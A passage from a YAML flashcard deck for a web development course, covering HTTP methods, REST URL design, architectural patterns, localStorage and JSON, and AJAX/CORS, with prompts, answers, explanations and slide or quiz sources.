            prompt: GET requests can be {{bookmarked}}, POST requests cannot.
            answer: bookmarked
            explanation: >-
              GET data appears in the URL. The browser can save and replay that URL as a bookmark. POST data is in the
              request body, which the browser does not capture in a bookmark.
            example: A search query like GET /patients?name=Alice can be bookmarked. POST /patients/ with a JSON body cannot.
            source: Slide 8, Quiz 6
            bloom: remember
          - id: rest-anatomy-card-03
            type: cloze
            prompt: PUT replaces the {{entire}} resource; PATCH updates a {{single}} property.
            answer: entire; single
            explanation: >-
              PUT is idempotent and replaces the full record at the URI. PATCH applies partial modifications. Sending
              PUT with a partial object overwrites omitted fields.
            example: >-
              PUT /patients/1 with {name: Bob, age: 25} replaces all fields. PATCH /patients/1 with {age: 26} updates
              only age.
            source: Slide 8
            bloom: understand
          - id: rest-anatomy-card-04
            type: name
            prompt: What does idempotent mean?
            answer: An operation is idempotent if applying it multiple times produces the same result as applying it once.
            explanation: >-
              GET, PUT, DELETE, and HEAD are idempotent. POST and PATCH are not. Sending the same DELETE request twice
              leaves the resource in the same state (deleted) as sending it once.
            example: >-
              DELETE /patients/1 called 10 times: patient #1 is deleted after the first call. The remaining 9 calls find
              nothing to delete — same final state.
            source: Slide 8
            bloom: understand
          - id: rest-anatomy-card-05
            type: predict
            prompt: Which HTTP method should you use to send 1 GB of data to a server?
            answer: POST
            explanation: >-
              GET appends data to the URL, which has a length limit enforced by browsers and servers. POST places data
              in the request body, which has no size limit.
            example: "Uploading a large file: POST /files/ with the file data in the body."
            source: Slide 8, Quiz 6, Quiz 7
            bloom: apply
            lang: js
          - id: rest-anatomy-card-06
            type: predict
            prompt: >-
              A user edits their profile on a social network. All fields are replaced with the new values. Which HTTP
              method is correct?
            answer: PUT
            explanation: >-
              PUT replaces the entire resource. When all fields are being replaced, PUT is the correct method. Use PATCH
              only when updating a subset of fields.
            example: PUT /users/99 with the full updated profile object.
            source: Slide 8, Quiz 7
            bloom: apply
            lang: js
          - id: rest-anatomy-card-07
            type: name
            prompt: What status code does a server return when a new resource is successfully created?
            answer: 201 Created
            explanation: >-
              201 Created signals that a new resource was created. It is returned after a successful POST or some PUT
              requests. A plain 200 OK means success without creation.
            example: "POST /patients/ → 201 Created with Location: /patients/42/"
            source: Slide 8
            bloom: remember
          - id: rest-anatomy-card-08
            type: predict
            prompt: Is it safe to send a username and password using GET? Why or why not?
            answer: No. GET data appears in the URL, exposing credentials in browser history, server logs, and proxy logs.
            explanation: >-
              GET appends data as query parameters in the URL. That URL is visible in browser history, server access
              logs, and any network intermediary. Credentials sent via GET are not confidential.
            example: GET /login?username=alice&password=secret123 — the password is visible in the URL bar and logs.
            source: Slide 8, Quiz 7
            bloom: analyze
            lang: js
          - id: rest-anatomy-card-09
            type: cloze
            prompt: Status codes in the {{4xx}} range indicate client errors.
            answer: 4xx
            explanation: >-
              The first digit of a status code indicates the category: 1xx informational, 2xx success, 3xx redirect, 4xx
              client error, 5xx server error. A 404 Not Found and 401 Unauthorized are both client errors.
            example: "404 Not Found: the client requested a resource that does not exist."
            source: Slide 8
            bloom: remember
          - id: rest-anatomy-card-10
            type: name
            prompt: Name the two types of headers in an API call and one example of each.
            answer: Request headers (e.g., API-key) and response headers (e.g., content-type).
            explanation: >-
              Request headers carry metadata from client to server: the API key identifies the caller, count and pageNo
              control pagination. Response headers carry metadata back: status is the HTTP code, content-type describes
              the resource format.
            example: "Request header: API-Key: abc123. Response header: Content-Type: application/json."
            source: Slide 3
            bloom: understand
          - id: rest-anatomy-card-11
            type: cloze
            prompt: GET responses can be {{cached}} by the browser; POST responses cannot.
            answer: cached
            explanation: >-
              Browsers and CDNs cache GET responses because GET is safe and idempotent — the same request reliably
              returns the same resource. POST changes server state, so caching the response would be incorrect.
            example: >-
              GET /patients/ returns a cached list on the second call. POST /patients/ always hits the server to create
              a new record.
            source: Slide 8, Quiz 6
            bloom: understand
          - id: rest-anatomy-card-12
            type: predict
            prompt: "Which HTTP method do you use to delete patient #5 from the system?"
            answer: DELETE /patients/5/
            explanation: >-
              DELETE removes the specified resource. It requires only the resource identifier in the URL. No request
              body is needed.
            example: DELETE https://api.example.com/v1/patients/5/
            source: Slide 8
            bloom: apply
            lang: js
      - id: web-arch-patterns
        name: Architectural Patterns
        tags:
          - monolithic
          - layered
          - MSA
          - SOA
          - serverless
          - FaaS
          - MVC
          - MVVM
        prose: >-
          Architectural patterns including monolithic, layered (n-tier), MSA/SOA, serverless/FaaS, MVC, and MVVM — each
          with distinct trade-offs for scalability and independent deployment.
        cards:
          - id: web-arch-patterns-card-01
            type: name
            prompt: >
              What architectural pattern bundles all application logic — UI, business logic, and data access — into a
              single deployable unit?
            answer: Monolithic architecture
            explanation: >
              Monolithic architecture treats the entire application as one piece. All code compiles together, deploys
              together, and runs on one process. This makes it simple to start but expensive to change as complexity
              grows.
            example: >
              A small e-commerce site where routing, product logic, and database queries all live in one Express app is
              monolithic. Deploying a coupon feature requires shutting down the entire site.
            source: Slide 2
            bloom: remember
          - id: web-arch-patterns-card-02
            type: cloze
            prompt: >
              In monolithic architecture, adding a new feature requires three steps: (1) {{shut down}} the entire
              application, (2) add the feature, (3) {{recompile}} before redeploying.
            answer: (1) shut down; (3) recompile
            explanation: >
              Because all code is bundled together, the whole system must stop before any part of it changes. MSA avoids
              this by letting you redeploy individual services without touching others.
            example: >
              Compare to MSA: Netflix can push a fix to its recommendation service while video streaming and billing
              continue running uninterrupted.
            source: Slide 2
            bloom: remember
          - id: web-arch-patterns-card-03
            type: name
            prompt: |
              Name the four layers of layered (n-Tier) architecture, from top to bottom.
            answer: Presentation Layer, Business Layer, Application Layer, Data Access Layer
            explanation: >
              Each layer handles one functional concern. Presentation handles UI; Business handles logic and decisions;
              Application holds shared libraries; Data Access handles database reads and writes. Strict layer boundaries
              enforce separation of concerns.
            example: >
              In a banking app, the Business Layer checks authorization before the Data Access Layer executes any SQL —
              no UI code ever touches financial records directly.
            source: Slide 2
            bloom: remember
          - id: web-arch-patterns-card-04
            type: cloze
            prompt: >
              In layered architecture, the {{Business Layer}} controls the application's logic, decision making, and
              routing of requests.
            answer: Business Layer
            explanation: >
              The Business Layer sits between the Presentation Layer and the Application Layer. It is where
              authorization decisions, workflow logic, and request routing live — keeping these concerns out of both the
              UI and the database code.
            example: >
              "Should this user be allowed to transfer funds?" — that question is answered in the Business Layer, not in
              the Presentation Layer that received the button click.
            source: Slide 2
            bloom: remember
          - id: web-arch-patterns-card-05
            type: name
            prompt: >
              MSA stands for ________ Architecture. What is the equivalent term on the slides, and how do they differ in
              this course?
            answer: >
              MSA = Microservice Architecture. SOA = Service-Oriented Architecture. In this course they refer to the
              same thing — do not contrast them.
            explanation: >
              The slides explicitly note: "MSA: Microservice Architecture / SOA: Service-Oriented Architecture —
              slightly different but refer the same thing in this course." Treating SOA as a predecessor or separate
              pattern is incorrect in this context.
            example: >
              Messenger (MSA service) runs independently from Facebook's core app. Either "MSA" or "SOA" would be
              correct labels for that relationship in COMP4537.
            source: Slide 2
            bloom: understand
          - id: web-arch-patterns-card-06
            type: name
            prompt: >
              In MSA, services communicate with each other exclusively through what mechanism? Name one consequence of
              this constraint.
            answer: >
              Services communicate only via API calls. Consequence: high-frequency inter-service communication generates
              many network round-trips, increasing latency compared to in-process calls in a monolith.
            explanation: >
              API-only communication enforces loose coupling — no service can reach into another service's database or
              memory directly. This independence enables independent deployment but adds network overhead.
            example: >
              In the COMP4537 API-centric MSA diagram, the client hits an API gateway, which routes requests to separate
              services in Japan, USA, UAE, and Korea — every hop is an API call returning JSON.
            source: Slide 2
            bloom: understand
          - id: web-arch-patterns-card-07
            type: name
            prompt: >
              What architectural pattern runs small, stateless functions in the cloud without the developer managing
              server infrastructure?
            answer: Serverless / Function-as-a-Service (FaaS)
            explanation: >
              In serverless architecture, a cloud provider handles all infrastructure: provisioning, scaling, and
              patching. The developer writes only the function logic and defines the API contract. "The server is
              developed by someone else and made available via API calls."
            example: >
              Sending an API request to an image-processing service that resizes and crops photos is serverless from the
              caller's perspective — no server to provision, pay for when idle, or patch.
            source: Slide 2
            bloom: remember
          - id: web-arch-patterns-card-08
            type: name
            prompt: |
              MVC stands for what three components, and what is each component responsible for?
            answer: >
              Model (data and business rules), View (UI rendering), Controller (receives input, coordinates Model and
              View).
            explanation: >
              MVC separates the three concerns that recur in every UI-driven application: what data exists, how it is
              displayed, and how user actions change it. Keeping them separate makes each component independently
              testable and replaceable.
            example: >
              GitHub was originally built on Ruby on Rails, an MVC framework. The "repository" object is the Model; the
              HTML page displaying commits is the View; the endpoint handling a push event is the Controller.
            source: Slide 2
            bloom: remember
          - id: web-arch-patterns-card-09
            type: cloze
            prompt: >
              MVVM improves on MVC by adding {{two-way data binding (via a ViewModel)}}, which synchronizes the View and
              Model automatically without the developer writing explicit event handlers.
            answer: two-way data binding (via a ViewModel)
            explanation: >
              In MVVM, the ViewModel exposes data streams. When either the View or the Model changes, the ViewModel
              propagates the update in both directions automatically. This is why frameworks like Angular and Vue are
              described as MVVM-based.
            example: >
              In a Vue form, editing an input field immediately updates the underlying data object and re-renders any
              computed display — no `addEventListener` required.
            source: Slide 2
            bloom: understand
          - id: web-arch-patterns-card-10
            type: name
            prompt: >
              You are designing a system for a large company where multiple teams each own a distinct function
              (payments, inventory, notifications). Deployments must be independent. Which architectural pattern fits,
              and name two companies that use it?
            answer: >
              MSA (Microservice Architecture). Companies: any two from Uber, Netflix, Amazon, eBay, SoundCloud, Groupon,
              realtor.com.
            explanation: >
              MSA lets each team own, deploy, and scale their service independently. The coordination cost is API
              contracts between services — the benefit is that no team blocks another's deployment cycle.
            example: >
              Amazon's checkout service, recommendation engine, and inventory tracker are separate MSA services. A bug
              in recommendations does not halt checkout.
            source: Slide 2
            bloom: analyze
      - id: json-localstorage
        name: JSON and Web Storage
        tags:
          - localStorage
          - JSON
          - origin
          - sessionStorage
        prose: >-
          JSON stringify/parse for object serialization, localStorage versus sessionStorage lifecycle, and web storage
          origin scope (protocol + domain + port).
        cards:
          - id: json-localstorage-card-01
            type: name
            prompt: What method retrieves a value from localStorage by key?
            answer: "`localStorage.getItem(key)`"
            explanation: >-
              `getItem` takes a string key and returns the stored string, or `null` if the key does not exist. There is
              no `.get()` method.
            example: "`window.localStorage.getItem('token')` returns the string stored under `'token'`."
            source: Quiz 5 Q1
            bloom: remember
          - id: json-localstorage-card-02
            type: cloze
            prompt: >-
              localStorage stores data with {{no expiration date}}, while sessionStorage stores data only until {{the
              browser tab is closed}}.
            answer: no expiration date; the browser tab is closed
            explanation: >-
              localStorage persists indefinitely until explicitly removed. sessionStorage is cleared automatically when
              the tab closes.
            example: >-
              A shopping-cart preference saved in localStorage survives browser restarts. A multi-step form's current
              page saved in sessionStorage is lost when the tab closes.
            source: Slide 2
            bloom: remember
          - id: json-localstorage-card-03
            type: cloze
            prompt: Web storage is scoped to the {{origin}} (the combination of {{protocol}}, {{domain}}, and {{port}}).
            answer: origin; protocol; domain; port
            explanation: >-
              Two pages share localStorage only when all three components match exactly. The path component is
              irrelevant.
            example: >-
              `http://myDomain.com/a.html` and `http://myDomain.com/b.html` share the same origin.
              `https://myDomain.com/a.html` does not — different protocol.
            source: Slide 2, Quiz 5 Q2, Q6, Exam-strategy pitfall 3
            bloom: understand
          - id: json-localstorage-card-04
            type: name
            prompt: What does `JSON.stringify()` do?
            answer: Converts a JavaScript object into a JSON string.
            explanation: >-
              The resulting string is flat text that can be stored in localStorage, sent over a network, or written to a
              file. `JSON.parse()` reverses the operation.
            example: "`JSON.stringify({ name: 'Alice' })` → `'{\"name\":\"Alice\"}'`"
            source: Slide 2, Slide 3
            bloom: remember
          - id: json-localstorage-card-05
            type: name
            prompt: What does `JSON.parse()` do?
            answer: Converts a JSON string back into a JavaScript object.
            explanation: >-
              It reconstructs the full object, including nested properties and arrays. The inverse of
              `JSON.stringify()`.
            example: "`JSON.parse('{\"name\":\"Alice\"}')` → `{ name: 'Alice' }`"
            source: Slide 2, Slide 3
            bloom: remember
          - id: json-localstorage-card-06
            type: name
            prompt: What method removes all items from localStorage for the current origin?
            answer: "`localStorage.clear()`"
            explanation: >-
              `clear()` deletes every key-value pair in the storage bucket for that origin. `removeItem(key)` deletes
              only one key. There is no `clearAll()` or `removeAll()` method.
            example: "`window.localStorage.clear()` empties all stored data."
            source: Slide 2, Quiz 5 Q7
            bloom: remember
          - id: json-localstorage-card-07
            type: predict
            prompt: |
              ```js
              localStorage.setItem('color', 'blue');
              const value = localStorage.getItem('color');
              localStorage.removeItem('color');
              localStorage.setItem('color', 'red');
              console.log(value);
              ```
              What does `console.log(value)` print?
            answer: "`'blue'`"
            explanation: >-
              `getItem` returned the string `'blue'` at the moment it was called and assigned it to `value`. Subsequent
              changes to localStorage do not retroactively update `value`.
            example: >-
              Variables hold values, not references to storage slots. Reassigning localStorage does not reach back into
              existing variables.
            source: Quiz 5 Q3
            bloom: apply
            lang: js
          - id: json-localstorage-card-08
            type: predict
            prompt: |
              Can `https://lab.aaa.com/1/index.html` read localStorage written by `https://aaa.com/labs/1/index.html`?
            answer: No.
            explanation: >-
              `lab.aaa.com` is a different subdomain from `aaa.com`. Subdomains are distinct origins — they do not share
              localStorage even if the top-level domain is the same.
            example: >-
              Quiz 5 Q6: the correct accessor is `https://aaa.com/labs/5/hello.html` (same origin) — not
              `https://lab.aaa.com/1/index.html`.
            source: Quiz 5 Q6, Exam-strategy pitfall 3
            bloom: apply
            lang: js
          - id: json-localstorage-card-09
            type: name
            prompt: Where in Chrome DevTools can you inspect localStorage entries?
            answer: Application tab → Storage → Local Storage
            explanation: >-
              The Application tab centralizes all client-side storage types: localStorage, sessionStorage, cookies,
              IndexedDB, and more.
            example: Open DevTools (F12), click the Application tab, expand Local Storage, select the origin.
            source: Quiz 5 Q9
            bloom: remember
          - id: json-localstorage-card-10
            type: cloze
            prompt: "Is nesting objects inside JSON valid? `{\"user\": {\"profile\": {\"name\": \"Alice\"}}}` is {{valid}} JSON."
            answer: valid
            explanation: >-
              JSON supports arbitrary nesting of objects and arrays. A common misconception is that JSON must be flat —
              this is false.
            example: >-
              `JSON.stringify({ user: { profile: { name: 'Alice' } } })` produces valid JSON and `JSON.parse`
              reconstructs it correctly.
            source: Quiz 5 Q10
            bloom: understand
          - id: json-localstorage-card-11
            type: name
            prompt: Which JSON method does NOT exist as a built-in?
            answer: "`JSON.convert()` — it does not exist."
            explanation: >-
              The only two built-in JSON methods are `JSON.stringify()` and `JSON.parse()`. Calling `JSON.convert()`
              throws `TypeError: JSON.convert is not a function`.
            example: "Quiz 5 Q8: `JSON.parse()` and `JSON.stringify()` are real; `JSON.convert()` is not."
            source: Quiz 5 Q8
            bloom: remember
          - id: json-localstorage-card-12
            type: predict
            prompt: |
              Is localStorage data stored in Chrome accessible from Firefox on the same computer?
            answer: No.
            explanation: >-
              localStorage is browser-specific. Chrome and Firefox each maintain separate storage buckets. Data is not
              shared across browsers even on the same machine.
            example: "Quiz 5 Q5: `'Data stored in local storage is persistent between different browsers'` → False."
            source: Quiz 5 Q5
            bloom: understand
            lang: js
          - id: json-localstorage-card-13
            type: cloze
            prompt: >-
              To store a JS object `obj` in localStorage under key `'data'`, write: `localStorage.setItem('data',
              {{JSON.stringify(obj)}})`.
            answer: "`JSON.stringify(obj)`"
            explanation: >-
              localStorage only stores strings. Passing an object directly coerces it to `'[object Object]'`.
              `JSON.stringify` produces a proper string representation.
            example: "`localStorage.setItem('user', JSON.stringify({ name: 'Alice', role: 'admin' }))`"
            source: Slide 2
            bloom: apply
      - id: restful-url-design
        name: RESTful URL Design and API Versioning
        tags:
          - REST
          - URL-design
          - versioning
          - plural-nouns
          - URI
        prose: >-
          RESTful URLs use plural nouns to name resource collections, path parameters to address individual resources,
          and the HTTP method — not a verb in the URI — to express the action. API versioning in the URI path allows an
          API to evolve without breaking existing clients.
        cards:
          - id: restful-url-design-card-01
            type: cloze
            prompt: >-
              RESTful APIs name resource collections with {{plural nouns}}. A collection of patients lives at
              `/patients`; one patient lives at `/patients/{{id}}`.
            answer: plural nouns; id
            explanation: >-
              Plural nouns signal a collection. Appending an ID segment narrows the address to one item. The HTTP method
              then expresses what to do with that item.
            example: "`/orders` is the collection. `/orders/42` is order number 42."
            source: Slide 11
            bloom: remember
          - id: restful-url-design-card-02
            type: name
            prompt: What is wrong with the URI `/getPatient/1` in a RESTful API?
            answer: >-
              It uses a verb in the URI. The correct form is `/patients/1` — the HTTP method (`GET`) expresses the
              action.
            explanation: >-
              REST's uniform-interface constraint requires that the URI identify a resource, not describe an operation.
              HTTP methods supply the operation. Mixing verbs into paths forces a new URI for every action.
            example: "Wrong: `GET /getPatient/1`. Correct: `GET /patients/1`."
            source: Slide 11
            bloom: understand
          - id: restful-url-design-card-03
            type: cloze
            prompt: POST /orders {{creates a new resource}}; PUT /orders/1 {{replaces an existing one}}.
            answer: creates a new resource; replaces an existing one
            explanation: >-
              POST targets the collection and appends a new item. PUT targets a specific URI and replaces the entire
              resource at that address. Confusing them sends the wrong HTTP method to the wrong endpoint.
            example: >-
              `POST /patients` — body contains new patient data, server assigns the ID. `PUT /patients/7` — body
              contains the complete replacement for patient 7.
            source: Slide 8
            bloom: remember
          - id: restful-url-design-card-04
            type: name
            prompt: Where does the version number belong in a RESTful URI, and what does the unversioned path point to?
            answer: >-
              The version belongs in the URI path, e.g. `/v1/catalog`. The unversioned path `/catalog` redirects to the
              latest version using an HTTP 3xx status code.
            explanation: >-
              Placing the version in the URI makes versioning explicit and stable. The unversioned path acts as a
              convenience pointer so callers who always want the latest do not need to track the current version number.
            example: "`/v1/patients/` is pinned to version 1. `/patients/` redirects to `/v2/patients/` when v2 becomes latest."
            source: Slide 11
            bloom: understand
          - id: restful-url-design-card-05
            type: cloze
            prompt: >-
              API versioning should be introduced {{before the first public release}}, not added retroactively, because
              adding it later {{breaks existing clients}} that are already calling the unversioned path.
            answer: before the first public release; breaks existing clients
            explanation: >-
              Clients that start calling `/patients/1` on day one have no version prefix baked in. Inserting `/v1/`
              later forces every client to update their endpoint strings — that change is itself a breaking change.
            example: >-
              Client code: `fetch('/patients/1')`. After adding versioning: `fetch('/v1/patients/1')`. Every client must
              update.
            source: Slide 11
            bloom: understand
          - id: restful-url-design-card-06
            type: name
            prompt: Name three situations that require releasing a new API version.
            answer: >-
              1. The format of the response data changes. 2. A field type changes (e.g., integer to float). 3. An
              endpoint is removed or its behaviour fundamentally changes.
            explanation: >-
              These are all breaking changes — existing clients that parse the response or call the endpoint will fail
              without modification. Non-breaking additions (new optional fields, new endpoints) do not require a new
              version.
            example: >-
              Changing a patient's `age` field from integer to a string `'28 years'` breaks clients that do arithmetic
              on it. That requires v2.
            source: Slide 11
            bloom: understand
          - id: restful-url-design-card-07
            type: cloze
            prompt: >-
              In a URI, the {{query string}} — the `?key=value` portion — passes values to customize output, while the
              {{URI path}} identifies which resource is being addressed.
            answer: query string; URI path
            explanation: >-
              Path encodes identity; query string encodes customization. Use path parameters for `GET /patients/1`
              (identity) and query strings for `GET /patients?page=2&limit=10` (filtering).
            example: >-
              `http://example.com/api/orders/1?format=summary` — path identifies order 1; query string requests summary
              format.
            source: Slide 11
            bloom: remember
          - id: restful-url-design-card-08
            type: name
            prompt: >-
              A client always wants the latest version of your API without updating their code. What URI design pattern
              supports this?
            answer: >-
              An unversioned path (e.g., `/catalog`) that redirects to the latest version (e.g., `/v2/catalog`) using an
              HTTP 3xx status code.
            explanation: >-
              The redirect approach lets the server advance the latest pointer without changing what the client calls.
              The client follows the redirect automatically. Clients that need stability should pin to a versioned URI.
            example: "`GET /catalog` → `302 Found` → `Location: /v2/catalog`. The client follows and gets the v2 response."
            source: Slide 11
            bloom: apply
          - id: restful-url-design-card-09
            type: cloze
            prompt: >-
              The REST recommendation from Slide 11 is to use {{plural nouns}} for defining resources, because the same
              path then serves both the {{collection}} (all items) and a {{single item}} (by appending `/{id}`).
            answer: plural nouns; collection; single item
            explanation: >-
              A plural noun reads naturally as a collection: `/patients` means 'all patients.' Appending an ID narrows
              to one: `/patients/42` means 'patient 42.' Singular nouns break this symmetry — `/patient` cannot cleanly
              represent the collection.
            example: "`/orders` → list all orders. `/orders/5` → order #5 specifically."
            source: Slide 11
            bloom: remember
      - id: modern-web-arch
        name: Modern Web Architecture Trends
        tags:
          - serverless
          - headless
          - DDD
          - DOMA
          - edge-computing
          - API-first
          - AIaaS
        prose: >-
          Modern architectural trends including serverless, headless architecture, DDD/DOMA, edge computing, API-first
          development, and AI-as-a-Service.
        cards:
          - id: modern-web-arch-card-01
            type: cloze
            prompt: >
              AI-as-a-Service (AIaaS) means cloud providers expose {{pre-trained AI models}} as API-accessible services.
              Examples include Google Cloud AI, {{AWS AI Services}}, and Azure Cognitive Services.
            answer: pre-trained AI models; AWS AI Services
            explanation: >
              AIaaS removes the need to build or train models from scratch. Developers call an API endpoint and receive
              AI results (image classification, language processing, speech transcription). The model infrastructure is
              entirely managed by the provider.
            example: >
              A web app that calls the AWS Rekognition API to detect faces in uploaded photos is using AIaaS — no ML
              training pipeline required.
            source: Slide 8
            bloom: remember
          - id: modern-web-arch-card-02
            type: name
            prompt: |
              What is the mechanism behind edge computing, and what problem does it solve?
            answer: >
              Edge computing processes data closer to the source (user's device or regional node) rather than in a
              centralized data center. It solves high latency caused by long-distance round-trips between users and
              central servers.
            explanation: >
              By moving compute to nodes geographically close to users, edge computing cuts the physical distance data
              must travel. Shorter distance means lower latency and faster response — critical for real-time
              applications, IoT telemetry, and low-latency gaming.
            example: >
              A CDN that processes image transformations at a regional edge node near the user, rather than routing to a
              central data center on another continent, is applying edge computing.
            source: Slide 8
            bloom: understand
          - id: modern-web-arch-card-03
            type: name
            prompt: >
              What does headless architecture decouple, and what is the primary benefit for organizations with multiple
              frontend clients?
            answer: >
              Headless architecture decouples the frontend presentation layer from the backend data and logic layers.
              The benefit: multiple frontends (web, mobile, IoT) can consume the same backend API without the backend
              containing any frontend-specific logic.
            explanation: >
              In a traditional CMS, the backend controls both content storage and HTML rendering. A headless CMS handles
              only content storage and delivers it via API. Frontend teams choose any rendering technology; the backend
              is unchanged.
            example: >
              A news organization's website, mobile app, and smart-TV interface all call the same headless CMS API to
              retrieve articles. Each frontend renders content differently without requiring separate backends.
            source: Slide 8
            bloom: understand
          - id: modern-web-arch-card-04
            type: name
            prompt: >
              What core concept does Domain-Driven Design (DDD) use to enforce separation of concerns between business
              domains in a large system?
            answer: >
              Bounded contexts. Each business domain is isolated within a boundary where its model is consistent and a
              team has clear ownership. Changes inside one bounded context do not affect others.
            explanation: >
              DDD recognizes that large systems contain multiple business domains (payments, inventory, recommendations)
              that have different rules and language. Bounded contexts prevent domain models from bleeding into each
              other, making the system easier to change and reason about.
            example: >
              In an e-commerce system, the "order" concept in the payments domain means something different than "order"
              in the warehouse domain. DDD gives each domain its own bounded context so both definitions coexist without
              collision.
            source: Slide 8
            bloom: understand
          - id: modern-web-arch-card-05
            type: name
            prompt: >
              What problem did Uber face that motivated DOMA (Domain-Oriented Microservice Architecture), and what
              structural change did DOMA introduce?
            answer: >
              Uber's MSA grew to hundreds of services with overlapping responsibilities and no clear boundaries.
              Maintaining consistency, scaling, and collaboration became difficult. DOMA reorganized services into
              domain groups, each with clear ownership and a domain-level API boundary.
            explanation: >
              Raw MSA at scale produces coordination failures: teams don't know which service owns what, duplicated
              logic accumulates, and changes have unpredictable blast radius. DOMA applies DDD's bounded-context
              thinking to service organization, restoring clarity at the organizational level.
            example: >
              After DOMA, Uber's "maps" domain group owns all location and routing services under one boundary. Other
              domains call the maps domain API rather than reaching into individual map services directly.
            source: Slide 8
            bloom: understand
          - id: modern-web-arch-card-06
            type: cloze
            prompt: >
              In serverless architecture, the developer is responsible only for {{the function logic (and API
              contract)}}. The cloud provider automatically handles {{deployment}}, scaling, and server management.
            answer: the function logic (and API contract); deployment
            explanation: >
              "Serverless" describes who manages infrastructure, not whether infrastructure exists. Servers still run
              the code — AWS, Azure, or GCP manages them. The developer never provisions, patches, or scales servers;
              those concerns are fully delegated to the provider.
            example: >
              An AWS Lambda function that resizes uploaded images runs on real AWS servers. The developer writes only
              the resize logic; AWS handles everything else. At zero traffic, zero servers are allocated and no cost
              accrues.
            source: Slide 8
            bloom: remember
          - id: modern-web-arch-card-07
            type: name
            prompt: >
              A developer uses Google AutoML to fine-tune an image classifier without writing any ML training code. What
              broader category of tooling does this represent, and name two other platforms in the same category?
            answer: |
              AutoML / no-code AI. Other platforms: HuggingFace, Kaggle.
            explanation: >
              AutoML platforms abstract the ML engineering layer. Users provide labeled data and configure training
              runs; the platform handles architecture search, training, and deployment. This extends AIaaS downward —
              not just consuming pre-trained models, but customizing them without deep ML expertise.
            example: >
              A retail company uses Google AutoML Vision to train a product defect detector from 2,000 labeled photos.
              No ML engineer on staff — the platform produces a deployable model endpoint the web team calls via API.
            source: Slide 8
            bloom: understand
  - id: m3-nodejs-server-development
    name: Node.js and Server-Side Development
    topics:
      - id: ajax-cors
        name: AJAX, CORS, and Same-Origin Policy
        tags:
          - AJAX
          - CORS
          - SOP
          - preflight
          - OPTIONS
          - XMLHttpRequest
          - readyState
        prose: >
          AJAX lets browser scripts send HTTP requests without page reloads, using XMLHttpRequest. The Same-Origin
          Policy blocks cross-origin reads; CORS lets the server explicitly permit them via response headers. readyState
          transitions 0–4; DONE is 4. Preflight (OPTIONS) fires before non-simple cross-origin requests.
        cards:
          - id: ajax-cors-card-01
            type: cloze
            bloom: remember
            source: Slide 5
            prompt: readyState {{4}} means the XMLHttpRequest operation is DONE.
            answer: "4"
            explanation: >
              readyState values are 0 (UNSENT) through 4 (DONE). DONE is 4, not 5. This is a direct exam trap documented
              in domain-specific pitfalls.
            example: if (this.readyState == 4 && this.status == 200) { ... }
          - id: ajax-cors-card-02
            type: cloze
            bloom: remember
            source: Slide 5
            prompt: |
              The four readyState values in order are: 0=UNSENT, 1=OPENED, 2={{HEADERS_RECEIVED}}, 3=LOADING, 4=DONE.
            answer: HEADERS_RECEIVED
            explanation: >
              State 2 fires when send() has been called and the server has returned response headers, before the body
              arrives.
            example: "case 2: console.log('Headers available');"
          - id: ajax-cors-card-03
            type: name
            bloom: remember
            source: Slide 5
            prompt: What does SOP stand for, and what does it do?
            answer: Same-Origin Policy — a browser rule that blocks scripts from reading cross-origin responses.
            explanation: >
              Origin = protocol + domain + port. SOP compares the document origin to the request target origin and
              blocks reads when they differ.
            example: http://localhost:3000 vs http://localhost:8000 — different ports = different origins.
          - id: ajax-cors-card-04
            type: name
            bloom: understand
            source: Slide 5
            prompt: What header must a server include to allow any origin to read its AJAX response?
            answer: "Access-Control-Allow-Origin: *"
            explanation: >
              CORS is configured server-side via response headers. The wildcard value permits all origins. A specific
              origin value restricts access to that origin only.
            example: res.setHeader("Access-Control-Allow-Origin", "*");
          - id: ajax-cors-card-05
            type: predict
            bloom: apply
            source: Slide 5, Quiz 6
            prompt: |
              What does the browser do when this handler fires?
              ```js
              if (this.readyState == 4 && this.status == 200) {
                document.getElementById("demo").innerHTML = this.responseText;
              }
              ```
            answer: >-
              Writes the response text into the #demo element. Fires only when the request is complete (readyState 4)
              and successful (HTTP 200).
            explanation: >
              The double condition guards against partial states (readyState 1–3) and failed requests (non-200 status
              codes). Both must be true to act.
            example: Standard AJAX success handler pattern from Slide 5.
            lang: js
          - id: ajax-cors-card-06
            type: name
            bloom: understand
            source: Slide 5
            prompt: What triggers a preflight request?
            answer: >
              A cross-origin request using a non-simple method (anything other than GET/POST) or a custom request
              header.
            explanation: >
              The browser sends an OPTIONS preflight first to ask the server whether it permits the intended
              method/headers from this origin. Simple GET and form-encoded POST do not trigger preflight.
            example: DELETE, PUT, or a JSON Content-Type header on a cross-origin POST all trigger preflight.
          - id: ajax-cors-card-07
            type: cloze
            bloom: understand
            source: Slide 5
            prompt: >
              A preflight is an {{OPTIONS}} request the browser sends before a non-simple cross-origin request to verify
              server permissions.
            answer: OPTIONS
            explanation: >
              OPTIONS is an HTTP method used to describe the communication options for a target resource. Browsers use
              it for CORS negotiation.
            example: "OPTIONS /api/data HTTP/1.1  Origin: http://localhost:3000"
          - id: ajax-cors-card-08
            type: name
            bloom: remember
            source: Slide 5
            prompt: What is an origin, precisely?
            answer: Protocol + domain + port — all three must match for two URLs to share the same origin.
            explanation: >
              Changing any single component creates a different origin. http vs https = different. port 3000 vs port
              8000 = different. lab.example.com vs example.com = different.
            example: http://localhost:3000 and https://localhost:3000 are different origins.
          - id: ajax-cors-card-09
            type: predict
            bloom: apply
            source: Slide 5
            prompt: |
              A script on http://localhost:3000 calls:
              ```js
              xhttp.withCredentials = true;
              ```
              and the server responds with `Access-Control-Allow-Origin: *`.
              What happens?
            answer: >-
              The browser rejects the response. withCredentials requires a specific origin in
              Access-Control-Allow-Origin, not the wildcard.
            explanation: >
              Credentials (cookies, Authorization headers) and the wildcard origin are mutually exclusive. The server
              must name the specific allowed origin.
            example: "Access-Control-Allow-Origin: http://localhost:3000  (not *)"
            lang: js
          - id: ajax-cors-card-10
            type: name
            bloom: remember
            source: Quiz 6
            prompt: Which HTTP method can be bookmarked? GET or POST?
            answer: >-
              GET — query parameters sit in the URL, making it bookmarkable. POST data is in the body and cannot be
              bookmarked.
            explanation: >
              GET requests encode parameters in the URL. POST requests place data in the request body with content-type
              application/x-www-form-urlencoded.
            example: "GET /search?q=ajax vs POST /search (body: q=ajax)"
          - id: ajax-cors-card-11
            type: predict
            bloom: analyze
            source: ISAQuiz7 Q4
            prompt: |
              A student writes:
              ```js
              const server = http.createServer((req, res) => {
                req.writeHead(200, { "Content-Type": "text/html" });
                req.write("<h1>Hello</h1>");
                req.end();
              });
              ```
              What is wrong?
            answer: >-
              req is the incoming request stream — it has no writeHead, write, or end methods. All three calls must use
              res (the response object).
            explanation: >
